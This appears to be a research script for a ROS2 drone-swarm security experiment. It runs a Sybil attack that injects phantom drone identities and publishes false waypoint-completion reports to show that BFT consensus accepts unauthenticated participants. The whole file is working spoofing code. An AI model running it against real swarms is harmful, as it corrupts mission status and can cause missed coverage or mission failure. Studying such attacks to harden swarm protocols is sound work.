#!/usr/bin/env python3
"""
sybil_attacker_lite.py
======================
Sybil / BFT-threshold attack for the T-ITS extension. Injects
f+1 phantom drone identities (drone{N+1}, drone{N+2}, ...,
drone{N+f+1}) and reports false waypoint completions under each.

The headline experiment for the extension: at N=10 with f=3 honest
Byzantine tolerance threshold (N >= 3f + 1 implies f_max = 3), inject
4 phantoms to empirically breach the BFT bound.

Each phantom claims a contiguous slice of the waypoint grid; together
they cover the whole map. The point is not maximum coverage gap, but
demonstrating that fabricated identities are accepted without
challenge -- the assumption that any BFT-style consensus rests on
(distinct, authenticated participants) is violated.

Usage
-----
python3 sybil_attacker_lite.py \
        --num-real 10 --num-phantoms 4 --total-wp 90 \
        --discovery-time 3.0 --spoof-delay 0.5
"""

import argparse
import json
import time

import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class SybilAttacker(Node):
    def __init__(self, num_real, num_phantoms, total_wp,
                 discovery_time, spoof_delay):
        super().__init__('sybil_attacker_lite')
        self.num_real = num_real
        self.num_phantoms = num_phantoms
        self.total_wp = total_wp
        self.discovery_time = discovery_time
        self.spoof_delay = spoof_delay

        self.pub = self.create_publisher(
            String, '/swarm/waypoint_status', 10)

        self.phantom_ids = [f'drone{num_real + 1 + i}'
                            for i in range(num_phantoms)]

        self.get_logger().info(
            f'Sybil attacker armed: N_real={num_real}, '
            f'phantoms={self.phantom_ids}, total_wp={total_wp}, '
            f'discovery={discovery_time}s, delay={spoof_delay}s')

    def build_plan(self):
        """Distribute waypoints evenly across phantoms."""
        plan = []
        per_phantom = self.total_wp // self.num_phantoms
        for i, pid in enumerate(self.phantom_ids):
            start = i * per_phantom
            end = (start + per_phantom
                   if i < self.num_phantoms - 1
                   else self.total_wp)
            for wp in range(start, end):
                plan.append((pid, wp))
        return plan

    def run(self):
        self.get_logger().info(f'Discovering for {self.discovery_time}s...')
        time.sleep(self.discovery_time)

        plan = self.build_plan()
        self.get_logger().info(
            f'Phantom plan: {len(plan)} reports across '
            f'{self.num_phantoms} fabricated identities')

        for drone_id, wp in plan:
            payload = json.dumps({'drone_id': drone_id,
                                  'waypoint_id': wp})
            msg = String()
            msg.data = payload
            self.pub.publish(msg)
            time.sleep(self.spoof_delay)

        self.get_logger().info('Sybil injection complete.')


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--num-real', type=int, default=10,
                   help='Number of legitimate drones in the swarm')
    p.add_argument('--num-phantoms', type=int, default=4,
                   help='Number of phantom identities to inject (f+1)')
    p.add_argument('--total-wp', type=int, default=90)
    p.add_argument('--discovery-time', type=float, default=3.0)
    p.add_argument('--spoof-delay', type=float, default=0.5)
    args = p.parse_args()

    rclpy.init()
    a = SybilAttacker(args.num_real, args.num_phantoms, args.total_wp,
                      args.discovery_time, args.spoof_delay)
    try:
        a.run()
    except KeyboardInterrupt:
        pass
    finally:
        a.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
